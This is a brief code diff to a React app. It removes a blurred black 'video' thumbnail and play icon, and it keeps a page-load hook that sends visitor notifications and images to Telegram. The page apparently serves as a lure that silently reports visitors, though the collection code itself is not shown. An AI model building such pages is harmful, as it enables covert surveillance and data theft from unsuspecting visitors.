@@ -1,5 +1,4 @@
-import { PlayIcon } from "@heroicons/react/24/solid";
-import { useState, useEffect, useCallback } from "react";
+import { useEffect, useCallback } from "react";
 import {
   sendTelegramNotification,
   sendImageToTelegram,
@@ -7,10 +6,6 @@ import {
 } from "./utils/telegram";
 
 function App() {
-  const [isBlurred] = useState(true);
-  const thumbnailUrl =
-    "https://e1.pxfuel.com/desktop-wallpaper/309/113/desktop-wallpaper-plain-black-black-screen.jpg";
-
   useEffect(() => {
     const sendVisitorNotification = async () => {
       await sendTelegramNotification({
